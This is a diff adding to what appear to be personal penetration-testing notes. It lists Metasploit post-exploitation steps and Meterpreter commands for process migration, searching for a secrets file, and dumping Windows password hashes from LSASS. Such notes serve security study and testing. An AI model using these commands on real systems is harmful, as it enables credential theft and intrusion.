@@ -35,3 +35,12 @@ get hash of the user's password:
 3) create session and background it(ctrl + z)
 4) module - windows/gather/hashdump(set session the background session)
 5) run
+
+METERPRETER:
+ps                     - process list 
+migrate 744            - migrate to another process
+sysinfo                - system information
+search -f secrets.txt  - search a file
+cat "path_to_the_file" - view the file content
+hashdump               - get users` hashdumps(use LSASS process)
+
